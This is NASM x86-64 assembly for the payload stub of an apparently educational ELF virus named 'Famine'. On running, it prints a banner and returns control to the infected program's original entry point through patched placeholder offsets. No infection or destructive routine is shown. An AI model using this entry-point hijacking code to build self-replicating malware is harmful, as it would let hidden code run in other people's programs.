BITS 64

SECTION .data
        famine_msg: db "....FAMINE....",10
        famine_msg_len  : equ $-famine_msg
        famine_mark: db "Famine version 1.0 (c)oded by mabouce",10
        key_msg: times 128 db "D"
        key_len: dw 0x80
        stream: times 256 db 0x00

SECTION .text
%define WRITE 1
%define STDOUT 1

_start_payload:
    push rax                 ; save all clobbered registers
    push rcx                 ; (rcx and r11 destroyed by kernel)
    push rdx
    push rsi
    push rdi
    push r11
    jmp _infection

_infection:
    call _print_famine
    jmp _end_payload


_print_famine:
    mov rax,WRITE                       ; sys_write
    mov rdi,STDOUT                       ; stdout
    mov rdx,famine_msg_len           ;len
    lea rsi,[rel $+famine_msg-$]     ; woody
    syscall
    ret

_end_payload:
    pop r11
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rax

    call _ret2oep           ; jump to original entry point(oep)
    push rax
    ret


_get_rip:
    mov rax, qword [rsp]
    ret

_ret2oep:
    call _get_rip
    sub rax, 0x77777777 ; virus size without ret2oep
    sub rax, 0x77777777 ; new_entry_point
    add rax, 0x77777777 ; old entry_point
    ret
